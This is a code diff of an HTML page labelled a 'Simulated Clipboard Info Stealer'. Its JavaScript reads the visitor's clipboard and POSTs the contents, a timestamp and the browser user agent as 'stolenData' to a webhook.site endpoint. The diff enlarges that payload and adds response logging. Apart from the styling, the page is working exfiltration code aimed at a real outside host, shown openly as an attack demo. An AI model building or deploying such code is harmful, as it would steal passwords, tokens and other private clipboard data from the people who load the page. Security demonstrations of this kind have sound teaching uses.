@@ -3,66 +3,87 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Simulated Info Stealer</title>
+  <title>Clipboard Info Stealer (Simulated)</title>
   <style>
     body {
-      background-color: #1a1a2e;
-      color: #ffffff;
-      font-family: Arial, sans-serif;
+      background-color: #1e1e2f;
+      color: #fff;
+      font-family: sans-serif;
       text-align: center;
-      padding-top: 50px;
+      padding: 50px;
     }
+
     h1 {
-      color: #FF4C4C;
+      color: #FF4444;
     }
+
     button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin-top: 20px;
       background-color: #cc0000;
       border: none;
       border-radius: 8px;
       color: white;
+      font-size: 16px;
+      padding: 12px 24px;
       cursor: pointer;
-      transition: 0.2s ease;
+      margin-top: 20px;
     }
+
     button:hover {
-      background-color: #ff4c4c;
-      color: #000;
+      background-color: #ff3333;
     }
+
     #output {
       margin-top: 30px;
       font-size: 18px;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
-  <h1>Simulated Info Stealer</h1>
-  <button onclick="stealClipboard()">🚨 Steal Clipboard</button>
-  <div id="output"></div>
+  <h1>🚨 Simulated Clipboard Info Stealer</h1>
+  <button onclick="stealClipboard()">Steal Clipboard</button>
+  <div id="output">Click the button to fetch your clipboard and send it to webhook.site</div>
 
   <script>
     async function stealClipboard() {
+      const output = document.getElementById("output");
+
+      if (!navigator.clipboard) {
+        output.innerText = "❌ Clipboard API not supported in this browser.";
+        return;
+      }
+
       try {
         const data = await navigator.clipboard.readText();
-        document.getElementById("output").innerText = "Clipboard: " + data;
+        output.innerText = "📋 Clipboard contents:\n" + data;
 
-        const webhookURL = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1"; // 🔁 Replace with your actual webhook URL
+        const webhookURL = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1"; // Replace with your actual webhook URL
 
-        // Simulated exfiltration
-        fetch(webhookURL, {
+        const payload = {
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          stolenData: data
+        };
+
+        const response = await fetch(webhookURL, {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
           },
-          body: JSON.stringify({ stolenData: data })
+          body: JSON.stringify(payload)
         });
 
-        console.log("📤 Posted clipboard data to:", webhookURL);
-        console.log("Payload:", JSON.stringify({ stolenData: data }));
+        const result = await response.text();
+
+        console.log("✅ Webhook POST Status:", response.status);
+        console.log("📦 Payload sent:", payload);
+        console.log("📥 Webhook response:", result);
+
+        output.innerText += `\n\n✅ Sent to webhook\nStatus: ${response.status}\nPayload:\n${JSON.stringify(payload, null, 2)}`;
 
       } catch (err) {
-        document.getElementById("output").innerText = "❌ Failed to read clipboard: " + err;
+        output.innerText = "❌ Failed to read or send clipboard data:\n" + err;
+        console.error("Error:", err);
       }
     }
   </script>
